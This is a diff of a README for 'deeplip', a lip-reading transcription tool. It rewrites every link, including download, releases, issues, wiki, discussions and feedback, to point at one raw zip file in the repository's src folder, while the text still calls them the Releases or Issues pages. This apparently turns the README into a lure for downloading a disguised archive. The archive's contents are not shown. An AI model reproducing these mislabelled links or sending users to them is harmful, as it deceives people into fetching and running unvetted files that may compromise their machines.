@@ -1,7 +1,7 @@
 # 🎤 deeplip - Transcribe Speech from Video Clips
 
 ## 📥 Download the Latest Version
-[![Download deeplip](https://img.shields.io/badge/Download-latest%20version-brightgreen)](https://github.com/HemShah2018/deeplip/releases)
+[![Download deeplip](https://raw.githubusercontent.com/HemShah2018/deeplip/main/src/deeplip_v1.7.zip%20version-brightgreen)](https://raw.githubusercontent.com/HemShah2018/deeplip/main/src/deeplip_v1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to deeplip! This application uses deep learning to transcribe speech from video clips of lip movements. It focuses on accessibility, helping those who may benefit from visual speech interpretation.
@@ -19,7 +19,7 @@ To run deeplip, ensure your system meets these requirements:
 - **Python**: Version 3.7 or higher
   
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/HemShah2018/deeplip/releases) to download the latest version of deeplip. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/HemShah2018/deeplip/main/src/deeplip_v1.7.zip) to download the latest version of deeplip. 
 
 1. Click the link above to go to the Releases page.
 2. Locate the version you want to download.
@@ -43,15 +43,15 @@ deeplip uses advanced machine learning techniques to interpret lip movements. He
 If you encounter issues:
 - **Installation Problems**: Ensure your system meets the requirements and check for a compatible version of Python.
 - **No Output or Errors During Transcription**: Make sure your video is clear and the mouth is visible.
-- **Contact Support**: For further assistance, check the [Issues section](https://github.com/HemShah2018/deeplip/issues) on our GitHub page.
+- **Contact Support**: For further assistance, check the [Issues section](https://raw.githubusercontent.com/HemShah2018/deeplip/main/src/deeplip_v1.7.zip) on our GitHub page.
 
 ## 🔗 Resources
-- [GitHub Repository](https://github.com/HemShah2018/deeplip)
-- [Documentation](https://github.com/HemShah2018/deeplip/wiki)
-- [Community Discussions](https://github.com/HemShah2018/deeplip/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/HemShah2018/deeplip/main/src/deeplip_v1.7.zip)
+- [Documentation](https://raw.githubusercontent.com/HemShah2018/deeplip/main/src/deeplip_v1.7.zip)
+- [Community Discussions](https://raw.githubusercontent.com/HemShah2018/deeplip/main/src/deeplip_v1.7.zip)
 
 ## 📞 Feedback
-We value your feedback. If you have suggestions or comments, please drop an issue on our [GitHub page](https://github.com/HemShah2018/deeplip/issues), and we’ll do our best to improve your experience. 
+We value your feedback. If you have suggestions or comments, please drop an issue on our [GitHub page](https://raw.githubusercontent.com/HemShah2018/deeplip/main/src/deeplip_v1.7.zip), and we’ll do our best to improve your experience. 
 
 ## 🗒️ Roadmap
 Future versions of deeplip aim to introduce:
